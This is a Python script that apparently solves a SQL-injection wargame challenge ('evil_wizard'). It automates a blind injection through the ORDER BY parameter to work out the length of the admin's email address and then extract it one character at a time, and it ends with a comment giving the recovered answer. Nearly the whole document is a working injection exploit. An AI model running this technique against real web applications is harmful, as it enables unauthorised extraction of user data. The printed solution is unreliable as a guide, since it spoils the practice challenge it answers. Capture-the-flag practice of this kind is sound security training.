import requests
url = 'https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php'
cookies = {'PHPSESSID': 'dalgd23k7dqn8uuosfq35ahmof'}
flag = ""
for i in range(1,50):
    try:
        query = url+"?order=if((id='admin' and length(email)="+str(i)+"),score,9999)"
        response = requests.get(query, cookies=cookies)
    except:
        print("[-]Error occur!")
        continue
    html_data = response.text
    print(response.url)
    # print(html_data)
    if ("<td>50</td></tr><tr><td>rubiya</td>" in html_data):
        print ("[+]Find Length : " + str(i))
        length = i
        break
print(length)
 
for i in range(1,length+1):
    for j in range(33,127):
        try:
            query = url + "?order=if((id='admin' and ord(substr(email,"+str(i)+",1))="+str(j)+"),score,9999)"    
            response = requests.get(query, cookies=cookies)
        except:
            print("[-]Error occur!")
            continue
        html_data = response.text
        print(response.url)
        if ("<td>50</td></tr><tr><td>rubiya</td>" in html_data):
            print ("[+]Find Key : " + chr(j))
            flag += chr(j)
            break
print (flag)

# solve : admin_secure_email@emai1.com
